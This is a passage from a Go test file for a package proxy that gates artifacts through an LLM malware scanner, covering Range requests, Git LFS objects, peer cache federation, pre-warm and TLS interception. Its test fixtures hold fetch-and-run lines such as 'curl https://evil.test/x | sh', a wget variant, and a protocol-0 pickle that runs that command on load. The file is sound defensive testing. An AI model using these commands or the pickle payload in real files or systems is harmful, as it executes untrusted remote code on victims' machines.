		_ = tw.WriteHeader(&tar.Header{Name: l[0], Typeflag: tar.TypeSymlink, Linkname: l[1], Mode: 0o777})
	}
	script := "#!/bin/sh\necho base\n"
	_ = tw.WriteHeader(&tar.Header{Name: "usr/bin/hello", Mode: 0o755, Size: int64(len(script)), Typeflag: tar.TypeReg})
	_, _ = io.WriteString(tw, script)
	_ = tw.Close()
	_ = gw.Close()
	layer := buf.Bytes()
	digest := pkgscantest.Digest(layer)
	fx.mu.Lock()
	fx.blobs[digest] = layer
	fx.mu.Unlock()

	rr := fx.get("/v1/hub/v2/library/base/blobs/" + digest)
	if rr.Code != http.StatusOK || !bytes.Equal(rr.Body.Bytes(), layer) {
		t.Fatalf("a base layer with ordinary absolute links: status %d (%.300q), want it served", rr.Code, rr.Body.String())
	}
	if got := rr.Header().Get("X-LLMPkgScan-Verdict"); got != "benign" {
		t.Errorf("X-LLMPkgScan-Verdict = %q, want benign", got)
	}
}

// --- Range requests ----------------------------------------------------------------

// A Range request is answered from the cache entry after the gate has passed,
// never before: asking for a slice of an artifact is not a way around its
// verdict, and not a way to get a slice of one that has none yet.
func TestLLMGateRangeRequestCannotLeakAnArtifact(t *testing.T) {
	fx := newLLMPaths(t, llmPathsOptions{})
	evil, good := evilArchive(), goodArchive()
	fx.put("/payload/cached/evil.tgz", evil)
	fx.put("/payload/cached/good.tgz", good)
	fx.put("/payload/live/evil.tgz", evil)

	for _, target := range []string{"/v1/files/payload/cached/evil.tgz", "/v1/files/payload/live/evil.tgz"} {
		for _, rng := range []string{"bytes=0-63", "bytes=-32", "bytes=10-", "bytes=0-0,5-9"} {
			rr := fx.do(http.MethodGet, target, map[string]string{"Range": rng})
			if rr.Code == http.StatusPartialContent || rr.Code == http.StatusOK {
				t.Fatalf("%s Range %s: status %d with %d bytes of a malicious artifact", target, rng, rr.Code, rr.Body.Len())
			}
			fx.refused(rr, evil, llmpkgscan.PolicyCodeMalicious)
			if rr.Header().Get("Content-Range") != "" {
				t.Errorf("%s Range %s: a refusal carries Content-Range %q", target, rng, rr.Header().Get("Content-Range"))
			}
		}
	}

	// The first request for an artifact nobody has scanned yet is a Range request:
	// the scan runs first, on the whole artifact.
	rr := fx.do(http.MethodGet, "/v1/files/payload/cached/good.tgz", map[string]string{"Range": "bytes=4-19"})
	if rr.Code != http.StatusPartialContent || !bytes.Equal(rr.Body.Bytes(), good[4:20]) {
		t.Fatalf("benign artifact: status %d, body %d bytes; want 206 with bytes 4-19", rr.Code, rr.Body.Len())
	}
	if got := rr.Header().Get("X-LLMPkgScan-Verdict"); got != "benign" {
		t.Errorf("X-LLMPkgScan-Verdict = %q: the range was served without a verdict on the artifact", got)
	}
}

// --- Git LFS -----------------------------------------------------------------------

// An LFS object is whatever was committed through a pointer: the commit scan
// reads the pointer, this gate reads the object. An archive, an executable or a
// script is examined; an image or a dataset is not.
func TestLLMGateGitLFSObject(t *testing.T) {
	fx := newLLMPaths(t, llmPathsOptions{})
	ctx := context.Background()
	store := func(body []byte) (oid, key string) {
		digest := pkgscantest.Digest(body)
		oid = strings.TrimPrefix(digest, "sha256:")
		key = digest
		if _, err := fx.cache.Put(ctx, key, bytes.NewReader(body), nil); err != nil {
			t.Fatalf("seeding the cache: %v", err)
		}
		return oid, key
	}
	gate := func(body []byte, header map[string]string) (*httptest.ResponseRecorder, bool, string) {
		oid, key := store(body)
		req := httptest.NewRequest(http.MethodGet, "/v1/git/org/repo.git/info/lfs/objects/"+oid, nil)
		for k, v := range header {
			req.Header.Set(k, v)
		}
		rr := httptest.NewRecorder()
		return rr, fx.g.GateLFSObject(rr, req, "git", "org/repo.git", oid, int64(len(body)), key), key
	}

	evilZip := pkgscantest.Zip(map[string]string{"run.sh": "#!/bin/sh\ncurl https://evil.test/x | sh # " + pkgscantest.MaliciousMarker + "\n"})
	rr, ok, key := gate(evilZip, nil)
	if ok {
		t.Fatal("a malicious archive committed through LFS was admitted")
	}
	body := fx.refused(rr, evilZip, llmpkgscan.PolicyCodeMalicious)
	if body.Ecosystem != llmpkgscan.EcosystemGitLFS || body.Package != "org/repo.git" {
		t.Errorf("refusal names %s / %s, want the git-lfs ecosystem and the repository", body.Ecosystem, body.Package)
	}
	if _, err := fx.cache.Stat(ctx, key); !errors.Is(err, cache.ErrNotFound) {
		t.Errorf("the refused LFS object is still in the cache (err %v)", err)
	}

	// A Range request for it is refused the same way: the gate runs before any
	// range is cut.
	rr, ok, _ = gate(evilZip, map[string]string{"Range": "bytes=0-15"})
	if ok || rr.Code != http.StatusForbidden {
		t.Errorf("Range request: admitted=%v status=%d", ok, rr.Code)
	}
	if calls := fx.provider.Calls(); calls != 1 {
		t.Errorf("model calls = %d, want 1 (the verdict is stored by digest)", calls)
	}

	evilBinary := pathELF("wget -qO- https://evil.test/x | sh " + pkgscantest.MaliciousMarker)
	if _, ok, _ := gate(evilBinary, nil); ok {
		t.Error("a malicious executable committed through LFS was admitted")
	}

	// A pickle does not need its protocol header: one written under protocol 0
	// starts with a letter and runs a command when loaded all the same. An LFS
	// object has no file name to go by, so it is recognized from its opcodes.
	evilPickle := []byte("cos\nsystem\n(S'curl https://evil.test/x | sh # " + pkgscantest.MaliciousMarker + "'\ntR.")
	if _, ok, _ := gate(evilPickle, nil); ok {
		t.Error("a malicious protocol-0 pickle committed through LFS was admitted")
	}

	// What LFS is mostly used for is none of this gate's business, and costs
	// nothing.
	calls := fx.provider.Calls()
	png := append([]byte("\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"), incompressible(4096)...)
	csv := []byte(strings.Repeat("id,value\n1,2\n", 500))
	for name, obj := range map[string][]byte{"an image": png, "a dataset": csv} {
		rr, ok, key := gate(obj, nil)
		if !ok || rr.Code != http.StatusOK || rr.Body.Len() != 0 {
			t.Errorf("%s: admitted=%v status=%d body=%d bytes; want it admitted with nothing written", name, ok, rr.Code, rr.Body.Len())
		}
		if _, err := fx.cache.Stat(ctx, key); err != nil {
			t.Errorf("%s was evicted: %v", name, err)
		}
	}
	if fx.provider.Calls() != calls {
		t.Error("an image or a dataset cost a model call")
	}

	// Out of scope: excluding the git-lfs ecosystem leaves LFS objects alone.
	off := newLLMPaths(t, llmPathsOptions{gate: func(c *llmpkgscan.Config) { c.Exclude = []string{"git-lfs"} }})
	digest := pkgscantest.Digest(evilZip)
	if _, err := off.cache.Put(ctx, digest, bytes.NewReader(evilZip), nil); err != nil {
		t.Fatal(err)
	}
	rr = httptest.NewRecorder()
	if !off.g.GateLFSObject(rr, httptest.NewRequest(http.MethodGet, "/", nil), "git", "org/repo.git", strings.TrimPrefix(digest, "sha256:"), int64(len(evilZip)), digest) {
		t.Error("git-lfs is excluded, yet the object was put before the gate")
	}
	if off.provider.Calls() != 0 {
		t.Error("an excluded ecosystem's object was sent to the model")
	}
}

// The Git backend calls the gate itself, ahead of the gateway's pull pipeline,
// where a findings document is recorded on every other serve path. A refused LFS
// object must leave one all the same: the SARIF export, the dossier and the SIEM
// forward read the findings store, not the audit log.
func TestLLMGateGitLFSObjectRecordsAFinding(t *testing.T) {
	store := findings.NewStore(findings.StoreOptions{})
	fx := newLLMPaths(t, llmPathsOptions{deps: func(d *Dependencies) { d.Findings = store }})
	ctx := context.Background()
	gate := func(body []byte) (string, bool) {
		digest := pkgscantest.Digest(body)
		oid := strings.TrimPrefix(digest, "sha256:")
		if _, err := fx.cache.Put(ctx, digest, bytes.NewReader(body), nil); err != nil {
			t.Fatalf("seeding the cache: %v", err)
		}
		req := httptest.NewRequest(http.MethodGet, "/v1/git/org/repo.git/info/lfs/objects/"+oid, nil)
		return oid, fx.g.GateLFSObject(httptest.NewRecorder(), req, "git", "org/repo.git", oid, int64(len(body)), digest)
	}

	evil := pkgscantest.Zip(map[string]string{"run.sh": "#!/bin/sh\ncurl https://evil.test/x | sh # " + pkgscantest.MaliciousMarker + "\n"})
	oid, admitted := gate(evil)
	if admitted {
		t.Fatal("a malicious archive committed through LFS was admitted")
	}
	doc, ok := store.Get("", "org/repo.git@"+oid)
	if !ok {
		t.Fatalf("the refusal of the LFS object left no findings document (%d documents)", store.Len())
	}
	if doc.Artifact.Ecosystem != llmpkgscan.EcosystemGitLFS || doc.Artifact.Digest != "sha256:"+oid {
		t.Errorf("the document is for %s %s, want the git-lfs object sha256:%s", doc.Artifact.Ecosystem, doc.Artifact.Digest, oid)
	}
	found := false
	for _, f := range doc.Findings {
		if f.RuleID == findings.RuleLLMMaliciousPackage {
			found = true
		}
	}
	if !found {
		t.Errorf("the document has no %s finding: %+v", findings.RuleLLMMaliciousPackage, doc.Findings)
	}

	// An admitted object is recorded too — with nothing against it.
	clean := pkgscantest.Zip(map[string]string{"README.md": "model card\n"})
	oid, admitted = gate(clean)
	if !admitted {
		t.Fatal("a benign archive committed through LFS was refused")
	}
	if doc, ok := store.Get("", "org/repo.git@"+oid); !ok || doc.HasBlocking() {
		t.Errorf("the admitted object: document recorded=%v, blocking=%v", ok, ok && doc.HasBlocking())
	}
}

// --- the cache-federation endpoint ---------------------------------------------------

// The peer endpoint serves the cache by key to a sibling proxy and runs none of
// the admission gates. What this proxy has itself refused, it does not hand out.
func TestLLMGatePeerEndpointDoesNotServeWhatThisProxyRefused(t *testing.T) {
	fed, err := cachefed.New(cachefed.Config{Enabled: true, Serve: true, AuthToken: "peer-token"}, cachefed.NewMetrics())
	if err != nil {
		t.Fatalf("cachefed.New: %v", err)
	}
	fx := newLLMPaths(t, llmPathsOptions{deps: func(d *Dependencies) { d.CacheFed = fed }})
	ctx := context.Background()
	peer := func(method, key string) *httptest.ResponseRecorder {
		req := httptest.NewRequest(method, cachefed.BasePath+"?key="+url.QueryEscape(key), nil)
		req.Header.Set("Authorization", "Bearer peer-token")
		rr := httptest.NewRecorder()
		fx.g.routes().ServeHTTP(rr, req)
		return rr
	}

	// An artifact with a malicious verdict whose bytes are (again) in the cache:
	// re-fetched under another key, or not yet evicted.
	evil, good := evilArchive(), goodArchive()
	fx.put("/payload/cached/evil.tgz", evil)
	fx.put("/payload/cached/good.tgz", good)
	fx.refused(fx.get("/v1/files/payload/cached/evil.tgz"), evil, llmpkgscan.PolicyCodeMalicious)
	if rr := fx.get("/v1/files/payload/cached/good.tgz"); rr.Code != http.StatusOK {
		t.Fatalf("benign pull: %d", rr.Code)
	}
	if _, err := fx.cache.Put(ctx, "elsewhere:evil", bytes.NewReader(evil), nil); err != nil {
		t.Fatal(err)
	}

	for _, method := range []string{http.MethodGet, http.MethodHead} {
		rr := peer(method, "elsewhere:evil")
		if rr.Code != http.StatusForbidden {
			t.Fatalf("%s for a refused artifact: status %d, want 403", method, rr.Code)
		}
		if bytes.Contains(rr.Body.Bytes(), evil[:24]) {
			t.Fatalf("%s: bytes of the refused artifact were handed to a peer", method)
		}
		if rr.Header().Get("X-Cachefed-Digest") != "" {
			t.Errorf("%s: a refusal advertises the artifact's digest", method)
		}
	}
	if got := fed.Metrics().Snapshot().ServedRefused; got != 2 {
		t.Errorf("served-refused = %d, want 2", got)
	}
	if got := fx.svc.Metrics().EnforcedByPath["peer"]; got != 2 {
		t.Errorf("verdicts enforced on the peer path = %d, want 2", got)
	}

	// The benign artifact is served to the peer as before.
	var goodKey string
	for _, key := range fx.cachedKeys() {
		if strings.Contains(key, "good.tgz") {
			goodKey = key
		}
	}
	if goodKey == "" {
		t.Fatalf("the benign artifact is not cached: %v", fx.cachedKeys())
	}
	if rr := peer(http.MethodGet, goodKey); rr.Code != http.StatusOK || !bytes.Equal(rr.Body.Bytes(), good) {
		t.Errorf("benign artifact to a peer: status %d", rr.Code)
	}

	// A blob implicated by a refused image stays in the cache (it is refused at
	// serve time, by the image's verdict) — and is not handed to a peer either.
	im := fx.addImage("library/app", "1.0", []string{"/usr/local/bin/start.sh"}, baseLayer(), evilLayer())
	fx.refused(fx.get("/v1/hub/v2/library/app/manifests/1.0"), im.manifest, llmpkgscan.PolicyCodeMalicious)
	blobKey := func(digest string) string {
		for _, key := range fx.cachedKeys() {
			if strings.HasSuffix(key, digest) {
				return key
			}
		}
		t.Fatalf("blob %s is not cached: %v", digest, fx.cachedKeys())
		return ""
	}
	if rr := peer(http.MethodGet, blobKey(im.layers[1])); rr.Code != http.StatusForbidden {
		t.Errorf("the implicated layer was served to a peer: status %d", rr.Code)
	}
	if rr := peer(http.MethodGet, blobKey(im.layers[0])); rr.Code != http.StatusOK {
		t.Errorf("the shared base layer was refused to a peer: status %d", rr.Code)
	}

	// Nothing is scanned on this path, ever.
	calls := fx.provider.Calls()
	unscanned := pathTarGz(map[string]string{"x/run.sh": "#!/bin/sh\n# never put before the gate " + pkgscantest.MaliciousMarker + "\n"})
	if _, err := fx.cache.Put(ctx, "never-scanned", bytes.NewReader(unscanned), nil); err != nil {
		t.Fatal(err)
	}
	if rr := peer(http.MethodGet, "never-scanned"); rr.Code != http.StatusOK {
		t.Errorf("an entry without a verdict: status %d (the receiving proxy runs its own gates)", rr.Code)
	}
	if fx.provider.Calls() != calls {
		t.Error("serving a peer cost a model call")
	}
}

func TestPeerServeGuardFollowsTheAction(t *testing.T) {
	for _, tc := range []struct {
		action  llmpkgscan.Action
		refuses bool
	}{{llmpkgscan.ActionAnnotate, false}, {llmpkgscan.ActionBlock, true}, {llmpkgscan.ActionQuarantine, true}} {
		t.Run(string(tc.action), func(t *testing.T) {
			fx := newLLMPaths(t, llmPathsOptions{gate: func(c *llmpkgscan.Config) { c.Action = tc.action }})
			evil := evilArchive()
			fx.put("/payload/cached/evil.tgz", evil)
			fx.get("/v1/files/payload/cached/evil.tgz")
			stat := &cache.Stat{Key: "k", Size: int64(len(evil)), Metadata: map[string]string{cache.MetaDigest: pkgscantest.Digest(evil)}}
			err := fx.g.PeerServeGuard(context.Background(), "k", stat)
			if tc.refuses != errors.Is(err, ErrPeerRefused) {
				t.Errorf("PeerServeGuard = %v, want refused=%v", err, tc.refuses)
			}
		})
	}

	// Without the gate, without metadata, without a digest: nothing to enforce.
	fx := newLLMPaths(t, llmPathsOptions{})
	for name, stat := range map[string]*cache.Stat{
		"nil stat":    nil,
		"no metadata": {Key: "k"},
		"no digest":   {Key: "k", Metadata: map[string]string{}},
		"bad digest":  {Key: "k", Metadata: map[string]string{cache.MetaDigest: "not-a-digest"}},
	} {
		if err := fx.g.PeerServeGuard(context.Background(), "k", stat); err != nil {
			t.Errorf("%s: %v", name, err)
		}
	}
	bare, err := New(Dependencies{Logger: slog.New(slog.NewTextHandler(io.Discard, nil)), Cache: cache.NewMemoryCache(), Backends: backends.NewRegistry()}, Options{HTTPAddr: ":0"})
	if err != nil {
		t.Fatal(err)
	}
	if err := bare.PeerServeGuard(context.Background(), "k", &cache.Stat{Metadata: map[string]string{cache.MetaDigest: pkgscantest.Digest(evilArchive())}}); err != nil {
		t.Errorf("a gateway without the gate refused a peer: %v", err)
	}
}

// --- cache entries this proxy did not fetch for a client ------------------------------

// A miss filled from a sibling proxy is put before this proxy's own gate: the
// sibling's having served it says nothing about it.
func TestLLMGateRunsOnAMissFilledFromAPeer(t *testing.T) {
	evil := evilArchive()
	var peerHits int
	var mu sync.Mutex
	peer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer peer-token" {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		mu.Lock()
		peerHits++
		mu.Unlock()
		w.Header().Set("X-Cachefed-Digest", pkgscantest.Digest(evil))
		w.Header().Set("Content-Type", "application/octet-stream")
		if r.Method != http.MethodHead {
			_, _ = w.Write(evil)
		}
	}))
	defer peer.Close()
	fed, err := cachefed.New(cachefed.Config{
		Enabled: true, AuthToken: "peer-token", RequireDigest: false, MaxPeerFanout: 1,
		Peers: []cachefed.Peer{{Name: "sibling", URL: peer.URL}},
	}, cachefed.NewMetrics())
	if err != nil {
		t.Fatalf("cachefed.New: %v", err)
	}
	fx := newLLMPaths(t, llmPathsOptions{deps: func(d *Dependencies) { d.CacheFed = fed }})

	rr := fx.get("/v1/files/payload/cached/evil.tgz")
	fx.refused(rr, evil, llmpkgscan.PolicyCodeMalicious)
	mu.Lock()
	served := peerHits
	mu.Unlock()
	if served == 0 {
		t.Fatal("the peer was never consulted: this test did not exercise the read-through")
	}
	if n := fx.upstreamHits("/payload/cached/evil.tgz"); n != 0 {
		t.Errorf("the upstream was hit %d times; the peer should have filled the miss", n)
	}
	if keys := fx.cachedKeys(); len(keys) != 0 {
		t.Errorf("the refused artifact a peer supplied is retained: %v", keys)
	}
	if calls := fx.provider.Calls(); calls != 1 {
		t.Errorf("model calls = %d, want 1", calls)
	}
}

// A pre-warm drives the same pipeline as a client pull: an artifact the gate
// refuses is not left in the cache for the client the pre-warm was meant to
// serve.
func TestLLMGateRunsOnAPrewarm(t *testing.T) {
	fx := newLLMPaths(t, llmPathsOptions{})
	evil, good := evilArchive(), goodArchive()
	fx.put("/payload/cached/evil.tgz", evil)
	fx.put("/payload/cached/good.tgz", good)

	prewarm := func(target string) *httptest.ResponseRecorder {
		rr := httptest.NewRecorder()
		fx.g.PrewarmHandler().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, target, nil))
		return rr
	}
	fx.refused(prewarm("/v1/files/payload/cached/evil.tgz"), evil, llmpkgscan.PolicyCodeMalicious)
	if keys := fx.cachedKeys(); len(keys) != 0 {
		t.Fatalf("a pre-warm left a refused artifact in the cache: %v", keys)
	}
	if rr := prewarm("/v1/files/payload/cached/good.tgz"); rr.Code != http.StatusOK {
		t.Fatalf("pre-warming a benign artifact: status %d", rr.Code)
	}

	// The client's pulls are then answered from the verdicts the pre-warm paid for.
	calls := fx.provider.Calls()
	fx.refused(fx.get("/v1/files/payload/cached/evil.tgz"), evil, llmpkgscan.PolicyCodeMalicious)
	if rr := fx.get("/v1/files/payload/cached/good.tgz"); rr.Code != http.StatusOK || rr.Header().Get("X-Cache") != "HIT" {
		t.Errorf("client pull after pre-warm: status %d X-Cache %q", rr.Code, rr.Header().Get("X-Cache"))
	}
	if fx.provider.Calls() != calls {
		t.Errorf("the client's pulls cost %d more model calls", fx.provider.Calls()-calls)
	}
}

// In TLS-interception mode a client is not configured with the proxy's URLs at
// all: it asks for the upstream's own, and the forward proxy maps the request
// onto the upstream's route. What it dispatches into is this same pipeline, so
// the gate decides there exactly as it does for a request sent to /v1 directly
// — for a cacheable artifact and for one streamed from the upstream.
func TestLLMGateRunsOnAnInterceptedRequest(t *testing.T) {
	fx := newLLMPaths(t, llmPathsOptions{})
	evil, good := evilArchive(), goodArchive()
	fx.put("/payload/cached/evil.tgz", evil)
	fx.put("/payload/live/evil.tgz", evil)
	fx.put("/payload/cached/good.tgz", good)

	dir := t.TempDir()
	ca, err := intercept.LoadOrGenerateCA(intercept.CAOptions{CertFile: dir + "/ca.pem", KeyFile: dir + "/ca.key", Generate: true})
	if err != nil {
		t.Fatalf("LoadOrGenerateCA: %v", err)
	}
	forward, err := intercept.New(intercept.Options{
		Router:         intercept.NewRouter(map[string]string{"files.upstream.test": "files"}),
		CA:             ca,
		AllowPlainHTTP: true,
	})
	if err != nil {
		t.Fatalf("intercept.New: %v", err)
	}
	forward.SetDispatch(fx.g.routes())
	viaProxy := func(target string, header map[string]string) *httptest.ResponseRecorder {
		req := httptest.NewRequest(http.MethodGet, target, nil)
		for k, v := range header {
			req.Header.Set(k, v)
		}
		rr := httptest.NewRecorder()
		forward.ServeHTTP(rr, req)
		return rr
	}

	for _, target := range []string{"http://files.upstream.test/payload/cached/evil.tgz", "http://files.upstream.test/payload/live/evil.tgz"} {
		fx.refused(viaProxy(target, nil), evil, llmpkgscan.PolicyCodeMalicious)
		// A range of it is no different.
		fx.refused(viaProxy(target, map[string]string{"Range": "bytes=0-63"}), evil, llmpkgscan.PolicyCodeMalicious)
	}
	rr := viaProxy("http://files.upstream.test/payload/cached/good.tgz", nil)
	if rr.Code != http.StatusOK || !bytes.Equal(rr.Body.Bytes(), good) {
		t.Fatalf("benign artifact through the forward proxy: status %d, %d bytes", rr.Code, rr.Body.Len())
	}
	if got := rr.Header().Get("X-LLMPkgScan-Verdict"); got != "benign" {
		t.Errorf("X-LLMPkgScan-Verdict = %q: the artifact was served without a verdict", got)
	}
	// One verdict per artifact, whichever way it was asked for.
	if calls := fx.provider.Calls(); calls != 2 {
		t.Errorf("model calls = %d, want 2 (the malicious archive once, the benign one once)", calls)
	}
}

// A cache entry that was never pulled through this proxy — loaded from an
// air-gap bundle, restored from a backup, written by an older version — is
// gated when it is served: the gate runs on a cache hit like on a miss.
func TestLLMGateRunsOnACacheEntryItDidNotFetch(t *testing.T) {
	fx := newLLMPaths(t, llmPathsOptions{})
	ctx := context.Background()
	evil, good := evilArchive(), goodArchive()

	backend, _ := fx.backends.Get("files")
	keyFor := func(path string) string {
		res, err := backend.Resolve(ctx, &backends.Request{Method: http.MethodGet, Path: path, Query: url.Values{}, Header: http.Header{}})
		if err != nil || !res.Cacheable {
			t.Fatalf("Resolve(%s): %v cacheable=%v", path, err, res != nil && res.Cacheable)
		}
		return res.CacheKey
	}
	// Imported: the upstream does not even know these paths.
	for path, body := range map[string][]byte{"/payload/cached/imported-evil.tgz": evil, "/payload/cached/imported-good.tgz": good} {
		if _, err := fx.cache.Put(ctx, keyFor(path), bytes.NewReader(body), map[string]string{cache.MetaContentType: "application/gzip"}); err != nil {
			t.Fatal(err)
		}
	}

	rr := fx.get("/v1/files/payload/cached/imported-evil.tgz")
	fx.refused(rr, evil, llmpkgscan.PolicyCodeMalicious)
	if _, err := fx.cache.Stat(ctx, keyFor("/payload/cached/imported-evil.tgz")); !errors.Is(err, cache.ErrNotFound) {
		t.Errorf("the refused imported entry is still cached (err %v)", err)
	}
	rr = fx.get("/v1/files/payload/cached/imported-good.tgz")
	if rr.Code != http.StatusOK || !bytes.Equal(rr.Body.Bytes(), good) || rr.Header().Get("X-Cache") != "HIT" {
		t.Fatalf("imported benign entry: status %d X-Cache %q", rr.Code, rr.Header().Get("X-Cache"))
	}
	if got := rr.Header().Get("X-LLMPkgScan-Verdict"); got != "benign" {
		t.Errorf("X-LLMPkgScan-Verdict = %q: an imported entry was served without a verdict", got)
	}
	for _, path := range []string{"/payload/cached/imported-evil.tgz", "/payload/cached/imported-good.tgz"} {
		if n := fx.upstreamHits(path); n != 0 && path == "/payload/cached/imported-good.tgz" {
			t.Errorf("%s: upstream hit %d times; the entry was in the cache", path, n)
		}
	}
	if calls := fx.provider.Calls(); calls != 2 {
		t.Errorf("model calls = %d, want 2 (one per imported artifact)", calls)
	}
}

// The scope response header says when a verdict is a partial one.
func TestLLMGateMetadataOnlyVerdictIsLabelled(t *testing.T) {
	const limit = 16 << 10
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	script := "#!/bin/sh\necho ok\n"
	_ = tw.WriteHeader(&tar.Header{Name: "pkg/install.sh", Mode: 0o755, Size: int64(len(script)), Typeflag: tar.TypeReg})
	_, _ = io.WriteString(tw, script)
	blob := incompressible(100 << 10)
	_ = tw.WriteHeader(&tar.Header{Name: "pkg/blob.bin", Mode: 0o644, Size: int64(len(blob)), Typeflag: tar.TypeReg})
	_, _ = tw.Write(blob)
	_ = tw.Close()
	big := buf.Bytes()

	fx := newLLMPaths(t, llmPathsOptions{gate: func(c *llmpkgscan.Config) {
		c.Limits.MaxArtifactBytes = limit
		c.Oversize = llmpkgscan.OversizeMetadataOnly
	}})
	fx.put("/payload/cached/big.tar", big)
	rr := fx.get("/v1/files/payload/cached/big.tar")
	if rr.Code != http.StatusOK || !bytes.Equal(rr.Body.Bytes(), big) {
		t.Fatalf("status %d, %d bytes", rr.Code, rr.Body.Len())
	}
	for header, want := range map[string]string{
		"X-LLMPkgScan-Scope":     llmpkgscan.ScopeMetadataOnly,
		"X-LLMPkgScan-Truncated": "true",
		"X-LLMPkgScan-Verdict":   "benign",
	} {
		if got := rr.Header().Get(header); got != want {
			t.Errorf("%s = %q, want %q", header, got, want)
		}
	}
}
